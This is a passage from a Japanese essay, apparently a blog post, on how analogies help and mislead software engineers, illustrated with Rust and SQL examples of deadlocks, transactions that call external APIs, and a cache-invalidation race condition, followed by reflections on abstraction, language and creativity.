タイムアウト！デッドロックが発生しました。現実の料理では、こんなことは起きない。「ちょっとナイフ貸して」と声をかければ済む。あるいは、「先にフォーク使っていいよ」と譲り合える。人間には、コミュニケーションがある。でも、コンピュータのスレッドは声をかけない。ロックを取得したら、自分の処理が終わるまで手放さない。相手が待っていることすら知らない。だから、永遠に待ち続ける。この問題のデバッグに、私は丸一日を費やした。プログラムが動かない。エラーも出ない。ただ、止まっている。「なぜプログラムが止まるのかわからない」と頭を抱えた。料理の類推では、デッドロックという概念自体が存在しなかったからだ。キッチンで誰かと道具の取り合いになっても、最終的にはどちらかが譲る。でも、プログラムは譲らない。また同じ失敗をしている。私は少し落ち込んだ。でも、まだ終わりではなかった。データベースのトランザクションでも、同じ失敗をした。（注：ここでも技術的な話が続きます。「銀行振込の類推で考えたが、実際のシステムはもっと複雑だった」という話として読んでいただければ大丈夫です。）まず、トランザクションとは何かを説明しよう。日常生活で例えてみる。あなたがコンビニでおにぎりを買うとする。この「買い物」という行為は、2つのことが同時に起きなければ成立しない。「あなたがお金を払う」と「店があなたにおにぎりを渡す」。お金だけ払っておにぎりがもらえなかったら困る。おにぎりだけもらってお金を払わなかったら、それは万引きだ。両方が成功するか、両方が起きないか。どちらかでなければならない。データベースでも同じだ。銀行の振込を考えよう。Aさんの口座から1万円を引いて、Bさんの口座に1万円を足す。この2つの操作は、両方成功するか、両方失敗するか、どちらかでなければならない。Aさんから引いたのにBさんに足されなかったら、1万円が消えてしまう。このような「ひとまとまりの操作」を保証する仕組みがトランザクションだ。途中で失敗したら、最初の状態に戻す（ロールバック）。すべて成功したら、確定する（コミット）。私は類推を作り上げた。「トランザクションは、銀行の振込みたいなものか」。この類推で、データベースの基本的な特性は理解できた。BEGIN TRANSACTION;UPDATE accounts SET balance = balance - 10000 WHERE user_id = \'A\';UPDATE accounts SET balance = balance + 10000 WHERE user_id = \'B\';COMMIT;問題は、トランザクションが失敗したときの処理を書いたときだった。async fn transfer_money(    pool: &PgPool,    from: &str,    to: &str,    amount: i64,) -> Result<(), Error> {    let mut tx = pool.begin().await?;    // 送金元の残高を減らす    sqlx::query(\\"UPDATE accounts SET balance = balance - $1 WHERE user_id = $2\\")        .bind(amount)        .bind(from)        .execute(&mut *tx)        .await?;    // 外部APIを呼び出して送金通知を送る（これが問題）    notify_transfer(from, to, amount).await?;    // 送金先の残高を増やす    sqlx::query(\\"UPDATE accounts SET balance = balance + $1 WHERE user_id = $2\\")        .bind(amount)        .bind(to)        .execute(&mut *tx)        .await?;    tx.commit().await?;    Ok(())}外部APIの呼び出しが失敗したら、トランザクションはロールバックされる。データベースの状態は元に戻る。完璧だと思った。でも、ある日、こんなシナリオを考えた。外部APIの呼び出しが成功した後、2番目のUPDATE文が失敗したらどうなるか。順番を追ってみよう。まず、送金元の残高を減らす。成功。次に、送金通知を送る。成功。通知は、もう相手に届いている。最後に、送金先の残高を増やす。ここで失敗。アカウントが凍結されていた。トランザクションはロールバックされる。データベースの残高は元に戻る。でも、通知は？もう送ってしまった。取り消せない。実際にPostgreSQLで検証してみた。--- シナリオ: 外部API成功後にDB更新が失敗 ---（Alice → frozen_account: 5,000円 - 受取人アカウント凍結で失敗）  → 通知を送信しました（外部API呼び出し）送金失敗: 受取人のアカウントが凍結されています残高:  alice: Alice (90000円)  ← 変わっていない  bob: Bob (60000円)送金通知: 2件  alice → bob: 10000円  alice → frozen_account: 5000円  ← 通知は送信された！トランザクションはロールバックされる。データベースの残高は元に戻る。でも、送金通知はすでに送られている。「5,000円送金しました」という通知が届いているのに、実際には送金されていない。銀行の振込では、こんなことは起きない。なぜか。銀行では、振込処理と通知は同じシステムの中で一貫して管理されている。「お金を動かす」と「通知を送る」が、一体の操作として設計されている。でも、私が書いたコードはそうではなかった。データベースと、通知を送るサービスは、別々のシステムだった。データベースのトランザクションは、データベースの中だけを巻き戻せる。外部サービスへの呼び出しは、トランザクションの外にある。ロールバックしても、すでに送った通知は取り消せない。これが「分散システム」の難しさだ。複数のシステムにまたがる操作を、一貫して管理することは、想像以上に難しい。より厄介な問題もあった。ロールバック自体が失敗することがあるのだ。async fn complex_operation(pool: &PgPool) -> Result<(), Error> {    let mut tx = pool.begin().await?;    // 複数のテーブルを更新    update_table_a(&mut tx).await?;    update_table_b(&mut tx).await?;    update_table_c(&mut tx).await?;  // ここで失敗    tx.commit().await?;    Ok(())}// update_table_c()が失敗すると、txはドロップされてロールバックされる// ...はずだが、ネットワーク障害でロールバックも失敗したら？銀行の振込では、「振込を取り消す」という操作は確実に成功する。窓口で「やっぱりやめます」と言えば、それで終わりだ。でも、コンピュータの世界では、ロールバック自体がネットワーク障害やデータベースクラッシュで失敗することがある。「元に戻す」という操作が、途中で止まる。そうなると、データは中途半端な状態で残る。Aさんから引かれたのに、Bさんには足されていない。1万円が宙に浮いている。この問題に気づいたのは、本番環境で実際に起きてからだった。ユーザーからの問い合わせで発覚した。「送金したのにお金が届いていない」。調べてみると、ネットワーク障害でロールバックが完了していなかった。「銀行の振込みたいなもの」という類推が、分散システムの複雑さを覆い隠していた。銀行の振込は、何十年もかけて作り上げられた堅牢なシステムの上で動いている。私のコードは、そうではなかった。いつになったら学習するのだろう。私は自分に問いかけた。でも、失敗はまだ続いた。キャッシュでも、同じパターンだった。（注：最後の技術的な事例です。「辞書を手元に置いておく類推で考えたが、実際はもっとややこしかった」という話です。）まず、キャッシュとは何かを説明しよう。日常生活で考えてみる。あなたは仕事中、よく使うファイルをどこに置いているだろうか。毎回、会社の書庫まで取りに行くだろうか。たぶん、よく使うファイルは自分の机の上に置いているはずだ。すぐ手に取れるから。これがキャッシュの発想だ。プログラムの世界でも同じだ。データベースからデータを取得するのは、時間がかかる。ネットワーク越しに問い合わせて、データベースが検索して、結果を返す。毎回これをやると遅い。だから、一度取得したデータを「手元」に保存しておいて、次からはそれを使う。これがキャッシュだ。私は類推を作り上げた。「キャッシュは、よく使うものを手元に置いておくことか」。辞書を引くとき、毎回本棚まで行くのは面倒だ。よく使う辞書は、机の上に置いておく。机の上にあれば、すぐに引ける。この類推で、キャッシュの基本は理解できた。use std::collections::HashMap;use std::sync::RwLock;struct UserCache {    cache: RwLock<HashMap<UserId, User>>,}impl UserCache {    async fn get_user(&self, id: UserId, db: &Database) -> User {        // まずキャッシュを確認        if let Some(user) = self.cache.read().unwrap().get(&id) {            return user.clone();        }        // なければDBから取得        let user = db.fetch_user(id).await;        // キャッシュに保存        self.cache.write().unwrap().insert(id, user.clone());        user    }}問題は、データが更新されたときだった。async fn update_user_email(    cache: &UserCache,    db: &Database,    id: UserId,    new_email: String,) -> Result<(), Error> {    // DBを更新    db.update_email(id, &new_email).await?;    // キャッシュを無効化    cache.cache.write().unwrap().remove(&id);    Ok(())}これで十分だと思った。データを更新したら、キャッシュから削除する。次にアクセスしたときは、DBから最新のデータを取得する。シンプルで、正しいはずだった。でも、ある問題が起きた。「競合状態（race condition）」だ。競合状態とは何か。例え話で説明しよう。あなたと同僚が、同時に同じ辞書を使おうとしている。あなたは辞書で「apple」を調べている。その間に、同僚が辞書の「apple」の項目に付箋を貼った。あなたが辞書を閉じて、もう一度開くと、付箋が貼ってある。これは問題ない。でも、こういうケースはどうか。あなたが辞書の「apple」のページをコピーしている間に、同僚が辞書の「apple」の項目を書き換えた。そして、あなたがコピーを終えて、そのコピーを棚にしまった。棚にあるのは、古い情報のコピーだ。これが競合状態だ。複数の処理が同時に動いているとき、その「順番」によって結果が変わってしまう。どの処理が先に終わるかは、そのときの負荷やネットワーク状況で変わる。だから、結果が予測できない。時刻T1: リクエストAがget_user()を呼ぶ時刻T1: リクエストAがキャッシュを確認 → ない時刻T2: リクエストAがDBからuser(email=\\"old@example.com\\")を取得時刻T3: リクエストBがupdate_user_email()を呼ぶ時刻T3: リクエストBがDBを更新(email=\\"new@example.com\\")時刻T4: リクエストBがキャッシュを削除時刻T5: リクエストAがキャッシュに古いデータを保存(email=\\"old@example.com\\")何が起きたのか、順番に見てみよう。リクエストAは、DBから古いデータを取得した。でも、キャッシュに保存する前に、一瞬待たされた。CPUが他の処理をしていたのかもしれない。ネットワークが混んでいたのかもしれない。その隙に、リクエストBがやってきた。リクエストBは、DBのデータを更新した。そして、キャッシュを削除した。「これで、次にアクセスしたときは最新のデータが取得される」と。でも、リクエストAはまだ終わっていなかった。リクエストAは、さっき取得した古いデータを、キャッシュに保存した。リクエストBが削除した後のキャッシュに。結果、キャッシュには古いデータが入った。DBには新しいデータがある。キャッシュとDBで、データが食い違っている。実行してみると、こうなる。[T1] リクエストA: get_user()開始  [キャッシュ] ミス[T2] リクエストA: DBから取得中...  [DB] 取得完了: email=\\"old@example.com\\"[T3] リクエストB: update_user_email()開始  [DB] メール更新: old@example.com -> new@example.com[T4] リクエストB: キャッシュ無効化[T5] リクエストA: キャッシュに保存  [キャッシュ] 保存: email=\\"old@example.com\\" ← 古いデータ！--- 結果確認 ---DBの値:        email=Some(\\"new@example.com\\")キャッシュの値: email=Some(\\"old@example.com\\")⚠️  キャッシュに古いデータが残っている！結果、キャッシュには古いデータが残り続ける。現実世界の辞書では、こんなことは起きない。なぜか。辞書の内容は、めったに変わらない。そして、辞書を使うのは通常1人だ。複数人が同時に同じ辞書を書き換えながら参照することは、まずない。でも、コンピュータのデータは違う。複数のプロセスが、同時に、同じデータを読み書きする。しかも、ネットワーク遅延やCPUスケジューリングで、処理の順序が予測できない。「Aが先に終わるはず」と思っても、実際にはBが先に終わることがある。この問題をデバッグするのに、3日かかった。「たまにデータが古いままになる」という報告を受けて、最初はDBの問題だと思った。DBを調べた。問題なかった。次にキャッシュの設定を調べた。問題なかった。ログを細かく分析して、やっと気づいた。タイミングの問題だった。特定の順番で処理が実行されたときだけ、問題が起きていた。「手元に置いておく」という類推は、キャッシュの無効化タイミングの複雑さを完全に見落としていた。机の上の辞書は、勝手に内容が変わらない。でも、キャッシュの中のデータは、いつ古くなるかわからない。Phil Karltonの有名な言葉がある。「コンピュータサイエンスで難しいことは2つしかない。キャッシュの無効化と、名前付けだ」。この言葉の意味を、私は身をもって理解した。どれも、類推としては間違っていない。でも、類推が示す以上のことを、私は類推から読み取ってしまっていた。類推は、理解を助ける。しかし、誤解も生む。類推は、新しい視点を与える。一方で、本質を見えなくもする。類推は、創造の源泉だ。同時に、思考停止の入り口でもある。これらの経験以来、私は類推について考え続けてきた。エンジニアとして、類推をどう使い分けるべきか。いつ類推すべきで、いつ類推を断つべきか。類推の力を活かしながら、その罠に落ちないためには、何が必要なのか。そして、もう1つ気づいたことがある。類推は、単なる思考ツールではない。それは、人間の知能の根幹だ。 われわれは、あまりにも無意識に類推的な考え方をしながら日々を過ごしている。だからこそ、類推の限界を知ることが、これほど重要なのだ。これは、類推に救われてきた人間が、類推に何度も裏切られた話だ。そして、それでもなお類推を手放せない人間が、類推とどう向き合うかを考えた記録だ。類推とは何かまず、類推とは何かを明確にしておきたい。類推（アナロジー）とは、2つの異なる領域の間に構造的な類似性を見出し、一方の知識を他方に適用する思考法だ。AとBは表面的には違うが、その関係性の構造は似ている。だから、Aで学んだことを、Bに応用できる。私は、類推こそが人間の思考の根幹だと考えている。論理的思考も、批判的思考も、創造的思考も、よく見ると類推が基盤にある。われわれは類推なしには、新しいことを考えることすらできない。ソフトウェアエンジニアなんて、類推だらけだ。コードを読んでいると、「あ、これ、あのコードと同じ構造だな」と気づく。設計を考えていると、「前のプロジェクトのあのパターンが使えそうだ」と気づく。バグを追っていると、「この挙動、前にも見たことがある」とピンとくる。私たちは、毎日、無意識に類推している。自分でも気づかないうちに。プログラミングを学ぶとき、類推を使っている。「変数は、ラベル付きの箱みたいなものだ」と教わる。値を入れて、取り出す。この類推があるから、抽象的な概念を具体的にイメージできる。新しいデータベースを学ぶとき、類推を使っている。「PostgreSQLのMVCCは、MySQLのInnoDBと似ているか」と考える。この類推があるから、ゼロから学ぶより速く理解できる。新しい言語を学ぶとき、類推を使っている。「Rustのtraitは、Goのinterfaceみたいなものか」と考える。完全に同じではないが、入り口にはなる。われわれの頭の中では、常に類推が働いている。既知の世界での関係づけから、未知の関係づけを推論している。物語を読むときも、私たちは類推している。登場人物の経験を自分の人生に重ね、フィクションの世界から現実への教訓を引き出す。主人公が困難を乗り越える姿を見て、自分の状況に当てはめる。異なる時代や文化を舞台にした物語から、普遍的な人間の営みを感じ取る。共感とは、つまり類推だ。「この人の気持ちは、あのときの自分の気持ちに似ている」。そう感じるから、私たちは物語に心を動かされる。類推がなければ、われわれは毎回ゼロから学ばなければならない。新しいフレームワークに出会うたび、過去の経験が役に立たない。累積的な学習ができない。技術も発展しない。だから、類推は人間の知能の基盤であり、思考の源泉だ。 これは疑いようがない。ここまで書いてきて、ふと気づいたことがある。私は今、類推について説明するために、言葉を使っている。では、言葉を使うとは、どういうことだろうか。目の前に、一冊の本がある。私はそれを見て、「本」と呼ぶ。でも、この「本」という言葉は、どこから来たのか。私がこれまでの人生で見てきた、無数の本。図書館で借りた本、書店で買った本、友人にもらった本。それらに共通する何かを抽出して、「本」というカテゴリを作った。目の前の物体を「本」と呼ぶとき、私はそれを、過去に見てきた本たちと「同じ仲間」だと判断している。これは、類推ではないか。「この物体は、私が知っている『本』に似ている。だから、これも『本』だ」。言葉を使うとは、目の前の具体的な現象を、過去に学んだカテゴリに当てはめることだ。当てはめるためには、類似性を見出さなければならない。つまり、言語化そのものが、類推なのだ。そう考えると、言葉の限界も見えてくる。目の前の本には、固有の特徴がある。紙の質感。インクの匂い。背表紙についた小さな傷。誰かが残した付箋。でも、「本」という言葉は、それらを捉えない。「本」という言葉が指すのは、無数の本に共通する抽象的な特徴だけだ。言葉にした瞬間、具体的な豊かさは零れ落ちる。だから、現状のすべてを完璧に表す言葉は、存在しない。 どんなに言葉を尽くしても、現実には追いつかない。言葉は常に近似だ。現実の一部を切り取っているだけだ。新しい経験をしたとき、私たちは「これは何だろう」と考える。既存の語彙の中から、「これに近い」言葉を探す。ぴったりの言葉が見つからなければ、複数の言葉を組み合わせる。それでも足りなければ、比喩を使う。「○○みたいなもの」と。でも、どれだけ工夫しても、言葉は現実を完全には捉えられない。類推は「AはBに似ている」という認識だ。言語化は「この現象は『X』という言葉に似ている」という認識だ。構造は同じだ。どちらも、目の前のものを、既知のものに当てはめる。そして、当てはめることで、何かを得る代わりに、何かを失う。私たちは、類推なしには思考できない。言葉なしには思考を伝えられない。でも、類推も言葉も、現実を完全には捉えられない。この記事を書いている今この瞬間も、私は類推と言葉の限界の中にいる。その限界を知りながら、それでも書くしかない。だからこそ、類推の限界を知ることが、これほど重要なのだ。しかし、だからこそ危険なのだ。類推はなぜ強力なのか類推の力を、もう少し詳しく見てみよう。抽象と具体の往復運動抽象的な概念は、そのままでは理解しにくい。人間の脳は、具体的なイメージを好む。抽象的な数学の公式より、具体的な例題の方が理解しやすい。抽象的な設計原則より、具体的なコード例の方が頭に入る。類推は、この抽象と具体を往復する運動だ。日常の例で説明しよう。カレーを作れる人は、シチューも作れる。なぜか。カレーとシチューは、表面的には違う料理だ。でも、「材料を切る → 炒める → 水を入れて煮る → ルーを溶かす」という構造は同じだ。カレーを作った経験から、この「構造」を抽出できれば、シチューに応用できる。これが抽象化であり、類推だ。プログラミングでも同じだ。具体的なもの（MySQL）を見て、抽象化（データを永続化するシステム）し、別の具体（PostgreSQL）に適用する。この往復が、類推の本質だ。ここで重要なのは、「抽象化」という能力だ。私の理解では、抽象化とは枝葉を切り捨てて幹を見ることだ。個別の事象から、本質的な構造だけを取り出す。MySQL、PostgreSQL、SQLiteはいずれも「SQLでデータを操作するシステム」という抽象に還元できる。Actix-web、Axum、Rocketはいずれも「HTTPリクエストを処理するRustのWebフレームワーク」という抽象に還元できる。この抽象化ができなければ、類推はできない。類推とは、2つの具体的な事象の間に共通の構造を見出すことだ。共通の構造を見出すには、まず具体から構造を抽出しなければならない。それが抽象化だ。私がこれまで見てきた限り、類推がうまい人は例外なく抽象化がうまい。 正しく抽象化できなければ、正しく類推できない。面白いことに、抽象の世界が見えている人には具体の世界も見える。でも、具体しか見えない人には抽象の世界が見えない。私はこれをマジックミラーのようなものだと思っている。抽象側からは両方見えるが、具体側からは向こう側が見えない。抽象を理解している人は、具体がその抽象の一例であることがわかる。「あ、これは○○の具体例だな」と。一方、具体しか見えない人は、それが何かの一例だとは気づかない。ただ、個別の事象として見るだけだ。だから、別の具体との共通点が見えない。多くの人は、この具体と抽象の往復運動を意識したことすらない。私自身、エンジニアになって何年も経ってから、やっと意識できるようになった。それまでは、類推を「なんとなく」やっていた。うまくいくこともあれば、失敗することもあった。でも、なぜ失敗するのかがわからなかった。抽象化を意識するようになってから、類推の成功率が上がった。「依存性の注入（DI）とは何か」。これはプログラムの設計手法の一つで、名前だけ聞くと難しそうに感じる。これを抽象的に説明すると、「オブジェクトが必要とする依存関係を外部から注入することで、結合度を下げてテスタビリティを高める設計パターン」となる。正確だが、初学者には意味不明だ。でも、「コンセントみたいなものだよ」と言えば、少し見えてくる。家電製品は、壁のコンセントに何が繋がっているか知らなくても動く。発電所が火力でも原子力でも太陽光でも、同じコンセントから電気が来る。DIも同じで、クラスは「何か」からデータベース接続を受け取るが、それが本番のMySQLなのかテスト用のモックなのかは知らなくていい。外部から「注入」される。類推によって、抽象が具体になる。見えなかったものが、見えるようになる。未知への橋渡し人間は、完全に未知のものを理解できない。新しい概念を学ぶとき、われわれは常に既知のものと関連づける。「これは、あれに似ている」。この関連づけがなければ、新しい知識は宙に浮いてしまう。既存の知識ネットワークに接続できない。類推は、未知と既知をつなぐ橋だ。Kubernetesを初めて学ぶとする。Kubernetesとは、たくさんのアプリケーションを複数のサーバーで効率よく動かすための管理システムだ。まったく新しい概念だ。でも、「Kubernetesは、コンテナのオーケストラ指揮者みたいなものだ。各コンテナ（アプリケーションを動かす小さな箱）がどこで動くべきか、いくつ動かすべきか、死んだら再起動すべきかを指示する」という類推があれば、入り口が見える。もちろん、この類推は不完全だ。Kubernetesの本質——宣言的な状態管理、コントロールループ、リコンシリエーション——を完全には捉えていない。でも、入り口にはなる。そこから、より正確な理解に進むことができる。類推は、足場だ。 建設現場の足場のように、本体を作るための仮の構造物だ。足場がなければ、高い建物は建てられない。類推がなければ、深い理解には到達できない。遠くから借りてくる力類推は、新しいアイデアを生む。異なる領域を結びつけることで、どちらの領域にも存在しなかった新しい視点が生まれる。ここで重要なのは、「どこから借りてくるか」だ。興味深いのは、同じ業界から持ってくるとパクりと言われるのに、違う業界からなら革命になることだ。なぜか。同じ業界の人は、同じものを見ている。だから、借りてきたことがすぐにバレる。でも、違う業界から借りてくると、誰も気づかない。そもそも、その業界を知らないからだ。他人が気づかないような遠くから借りてくる。そのために必要なのが、抽象化の力だ。遠い領域同士をつなげるには、それぞれの領域から本質的な構造を抽出しなければならない。表面的な違いを超えて、構造の類似を見抜く。これができる人だけが、革命を起こせる。生物の進化から、遺伝的アルゴリズムが生まれた。「自然選択と突然変異のプロセスを、最適化問題に適用したらどうだろう」。この類推が、新しい計算手法を生んだ。神経細胞のネットワークから、ニューラルネットワークが生まれた。「脳の情報処理を、コンピュータで模倣したらどうだろう」。この類推が、現在のAI革命の基盤を作った。私は、類推を創造の触媒だと思っている。異なる領域の知識を化学反応させて、新しいものを生む。遠くから借りてくるほど、その化学反応は激しくなる。近い領域から借りてくると、小さな改善にしかならない。遠い領域から借りてくると、パラダイムシフトが起きる。コミュニケーションの潤滑油類推は、相手にとって未知の概念を、既知の概念で説明することを可能にする。エンジニア同士でも、専門領域が違えば類推は有効だ。フロントエンドエンジニアにバックエンドの認証を説明するとき、JWT（JSON Web Token、ユーザーの認証情報を暗号化して持ち運ぶ仕組み）の説明をする機会がある。「JWTは、入場チケットみたいなものだよ」と言えば伝わる。一度発行されたら、チケット自体に情報が書いてある。だから毎回本部に問い合わせなくても、チケットを見せるだけで入れる。データベースのインデックス（データを高速に検索するための目次）を説明するときも同じだ。「本の索引みたいなものだよ。全ページをめくらなくても、索引を見れば目的の単語がどこにあるかすぐわかる」。チーム内でも類推は重要だ。リファクタリングとは、プログラムの動作を変えずに、コードの構造を整理・改善することだ。「このリファクタリングは、引っ越しみたいなものだ。荷物を新しい場所に移して、古い場所を片付ける。移行期間中は、両方にアクセスできるようにしておく」。こう言えば、作業のイメージが共有できる。類推は、異なる背景を持つ人々の間で、共通の理解を作る。類推はなぜ危険なのかここまで読むと、類推は素晴らしいものに思える。実際、素晴らしいのだ。でも、同時に危険でもある。なぜか。類推は「AとBは似ている」という前提に立っている。でも、この前提が正しいとは限らない。 似ているように見えて、実は違う。その違いが、致命的な判断ミスを生む。これは、ベストプラクティスが常に機能しないのと同じ構造だ。カンファレンスやブログで見たあの手法、あの技術、あの設計。「あの会社でうまくいったから、うちでもうまくいくはずだ」。こう考える。でも、これは類推だ。あの会社の文脈と、あなたの文脈は違う。あのチームと、あなたのチームは違う。ベストプラクティスが「ベスト」なのは、特定の文脈においてだけだ。 文脈が変われば、ベストではなくなる。デザインパターン（プログラム設計でよく使われる定番の解決策のカタログ）も同じだ。「このケースにはあのパターンが使える」と考える。でも、そのパターンが生まれた文脈と、今の文脈は違う。パターンを適用すれば解決するわけではない。パターンは出発点であって、答えではない。私が「何回説明しても伝わらない」と感じるとき、原因の多くは類推にある。類推は理解のショートカットとして強力だ。でも、相手と自分の「当たり前」が違うと、誤解を生む。なぜなら、類推は相手の頭の中にある既存の枠組みに接続するからだ。その枠組みが私と違えば、同じ言葉でも違う意味になる。冒頭の所有権の話を思い出してほしい。私は所有権を「本の貸し借りみたいなもの」と理解した。でも、「貸し借り」という言葉には、私が意識していなかった意味も含まれていた。「貸した相手との関係が続く」という意味だ。私は無意識にその意味も読み取っていた。だから、所有権を渡した後も「貸した先」を追跡できると思い込んでいた。類推が、私の思考を歪めていた。表面的類似と構造的類似の混同では、なぜ類推は失敗するのか。多くの場合、表面的な類似と構造的な類似を混同しているからだ。表面的な類似とは、見た目や印象の類似だ。「両方とも丸い」「両方とも赤い」「両方とも動く」。これは、誰でもすぐに気づく。構造的な類似とは、関係性のパターンの類似だ。「Aの中でXとYがこういう関係にあるのと同じように、Bの中でPとQもこういう関係にある」。これは、注意深く見ないと気づかない。類推が成立するためには、構造的な類似が必要だ。表面的な類似だけでは足りない。 問題は、人間が表面的な類似に騙されやすいことだ。見た目が似ていると、構造も似ていると思い込んでしまう。あるチームの話を聞いた。少し用語を説明しておこう。「モノリス」とは、1つの大きなプログラムとして構築されたシステムだ。「マイクロサービス」とは、機能ごとに小さなプログラムに分割し、それらを連携させるアーキテクチャだ。大企業が採用して成功したことで有名になった。そのチームは「マイクロサービスが成功しているから」という理由で、モノリスをマイクロサービスに分割しようとした。「あの有名企業がうまくいったんだから、うちもうまくいくはずだ」。表面的には似ている。「複雑なシステムを小さなサービスに分割する」という点で。しかし、構造は根本的に異なる。その有名企業には数千人のエンジニアがいる。専門のプラットフォームチームがいる。成熟した監視基盤がある。一方、そのチームは10人だった。運用の負荷が爆発的に増え、サービス間の通信障害のデバッグに追われ、結局モノリスに戻すことになった。彼らは、表面的な類似に騙されて、1年を失った。類推が思考を固定する類推には、もう1つ危険がある。思考を固定してしまうことだ。類推は、新しい視点を与える。「これはAみたいなものだ」と気づくと、Aの知識が使えるようになる。これは便利だ。でも同時に、Aの枠組みで考えるようになる。Aの論理で判断するようになる。Aで成立したことは、ここでも成立すると期待するようになる。ここに罠がある。BはAではない。Aにはない特性が、Bにはある。Bにはない特性が、Aにはある。類推によってAの枠組みを持ち込むと、Bの固有性が見えなくなる。Aとの共通点ばかりに目が行き、Aとの違いを見落とす。私はかつて、新しいチームのマネジメントで失敗した。前のチームで成功した方法を、そのまま適用しようとした。「前のチームと同じようにやればいい」と類推した。でも、チームが違えば、人が違う。カルチャーが違う。技術スタックが違う。ビジネスの文脈が違う。前のチームでうまくいった方法が、新しいチームでは逆効果だった。類推によって、私は新しいチームの固有性を見落としていた。「前のチームみたい」という枠組みが、目の前のチームを正確に見ることを妨げていた。これは、私だけの話ではない。世の中の「二番煎じ」は、すべてこの構造だ。表面的な成功パターンを真似る。でも、本質的な差異を見落としている。だから、同じ結果が得られない。独自性がないのではない。観察が浅いだけだ。類推が、観察を浅くしている。 成功事例を見て「うちも同じようにやろう」と考えるとき、私たちは無意識に類推している。でも、その類推が正しいかどうかを検証していない。表面的な類似に飛びついて、構造的な違いを無視している。類推は状況証拠であって物的証拠ではないここまでの話をまとめると、こうなる。類推は仮説であって、証明ではない。類推は、2つの領域の間に構造的な類似があるという仮定に基づいている。「AとBは似ているから、Aで成り立つことはBでも成り立つだろう」。これが類推の論理だ。でも、この仮定は、常に正しいとは限らない。似ているように見えて、実は違う。類推は状況証拠レベルであって、物的証拠レベルには至らない。ある領域で成功した法則が、別の領域でも通用する保証は、どこにもない。成功事例は、その文脈での成功を証明するだけだ。別の文脈での成功は、証明されていない。カンファレンスやブログで聞いた、あの会社の組織文化。あの会社でうまくいったからといって、すべての会社で同じ文化がうまくいくわけではない。あの有名な開発手法が成功したからといって、すべてのチームで同じ手法が成功するわけではない。成功事例から学ぶことは重要だ。でも、「あの会社みたいにやればいい」と単純に類推することは、危険だ。あの会社には、あの会社の文脈がある。業界。競合。人材市場。創業者の思想。歴史。規模。成長フェーズ。これらすべてが、あの文化を成立させている。あなたの会社には、あなたの会社の文脈がある。同じ文化を移植しても、機能するとは限らない。むしろ、害になることもある。より危険なのは、まったく新しい概念や技術を既存のものに無理やり当てはめることだ。ブロックチェーン（暗号技術を使って取引記録を改ざん困難な形で保存する技術）を「分散データベースみたいなもの」と類推すると、その本質的な違いを見落とす。信頼モデル（誰を信頼するか）、コンセンサスメカニズム（参加者間でどうやって合意を取るか）、イミュータビリティ（一度記録したら変更できないこと）——これらの特徴が、通常のデータベースとは根本的に異なる。結果的に間違った理解や過小評価につながる。類推を絶対視してはいけない。類推は仮説であって、証明ではない。類推がもたらす知的興奮ここまで、類推の危険性について書いてきた。でも、誤解しないでほしい。類推は危険だからといって、避けるべきものではない。類推には、代えがたい価値がある。類推は楽しい。類推は気持ちいい。 私は、類推が成功した瞬間の快感を、何度も味わってきた。まったく別のことに当てはまった時、頭の中で何かがつながる。あの瞬間——「あ、これって、あれと同じ構造だ」と気づく瞬間——には、独特の快感がある。世界の見え方がガラリと変わる。さっきまでバラバラだったものが、1つの構造で説明できるようになる。混沌が秩序になる。複雑が単純になる。なぜ、これが気持ちいいのか。人間は、わからないことに不安を感じる。新しい状況。未知の概念。複雑な問題。これらは、ストレスだ。脳は「これは何だ？」「どうすればいい？」と警戒モードに入る。でも、類推によって「あ、これは前に見たあれと同じだ」と気づくと、状況が一変する。未知が既知になる。複雑が単純になる。警戒モードが解除される。その瞬間、安堵とともに、快感が走る。これは、たぶん生存本能と関係している。予測できないものは危険だ。草むらで何かが動いた。あれは風か、それとも獲物か、それとも敵か。わからないと、逃げるべきか近づくべきか判断できない。でも、「あれは風だ」とわかれば、安心できる。予測できるものは安全だ。類推によって「これは、あれと同じだ」とわかると、予測ができるようになる。「あれ」のときはこうなった。だから、「これ」もそうなるだろう。予測ができると、安心する。安心は快感だ。しかも、類推は「遠くから借りてくる」ほど快感が大きい。 近い領域の類推——「MySQLはPostgreSQLに似ている」——は、驚きが少ない。当たり前だからだ。でも、遠い領域の類推——「ソフトウェアのリファクタリングは、文章の推敲と同じ構造だ」——は、発見の喜びが大きい。予想外のつながりだからだ。予想外であるほど、「わかった」瞬間のギャップが大きい。だから、快感も大きい。私がコードを書いていて、まったく関係ないはずの日常の出来事が当てはまることに気づいたとき。障害対応をしていて、これは以前経験した別の問題と同じ構造だと気づいたとき。設計を考えていて、過去に読んだ本の概念が使えると気づいたとき。そのたびに、ゾクっとする。「まさか、ここがつながるとは」という驚き。でも、よく考えると「なるほど、確かに同じだ」と納得できる。この驚きと納得の組み合わせが、最高に気持ちいい。類推の快感は、謎解きの快感に似ている。 バラバラだったピースが、カチッとはまる。見えなかった絵が、見えるようになる。あの瞬間の快感を知っている人は、類推をやめられない。日本では、この類推の喜びは昔から庶民の間で楽しまれていた。「○○と掛けて□□と解く。その心は△△である」という謎かけだ。まったく関係なさそうな2つのものが、ある抽象的な構造で結びつく。その発見の喜びが、笑いになる。漫才のツッコミも、類推と関係がある。ボケは、ある種の「間違った類推」だ。常識から逸脱したことを言う。ツッコミは、その逸脱を指摘する。「いや、それは違うやろ」と。ツッコミが面白いのは、観客が「そうそう、それはおかしいよね」と共感できるからだ。観客の頭の中にある「普通はこうだ」という枠組み——フレームと呼ぼう——に沿って、逸脱を指摘する。だから笑いが起きる。これは、類推の逆操作だ。類推が「AはBみたいなものだ」と結びつけるのに対して、ツッコミは「AはBではない」と切り離す。類推の破綻を、観客のフレームに沿って指摘する。ここで重要なのは、ツッコミが機能するためには、観客のフレームを理解していなければならないということだ。観客が「それはおかしい」と感じるポイントを、正確に捉えなければならない。これは、類推を使うすべての場面に通じる。私が所有権を「本の貸し借りみたいなもの」と理解したとき、私は「貸し借り」というフレームの中で考えていた。そのフレームの中では、貸し借りには「誰に貸したか」という追跡可能な関係が含まれていた。私は、そのフレームが当たり前だと思っていた。フレームの存在自体を意識していなかった。だから、フレームの限界が見えなかった。自分自身に対する「ツッコミ」——「いや、Rustの借用は、現実の貸し借りとは違うやろ」——ができなかった。自分がどんなフレームで類推しているかを意識しなければ、類推の限界が見えない。良い学習者は、類推を使うと同時に、自分自身でツッコミを入れる。「本の貸し借りみたいなものだけど、貸し借りと違って……」と。このツッコミができるかどうかが、類推で成功する人と失敗する人を分ける。創造性は異領域からの借用ソフトウェアエンジニアリングの歴史は、異なる領域からの借用の歴史でもある。Gitの分散型バージョン管理は、中央集権的なSVNの限界を、分散システムの発想で打破した。Git 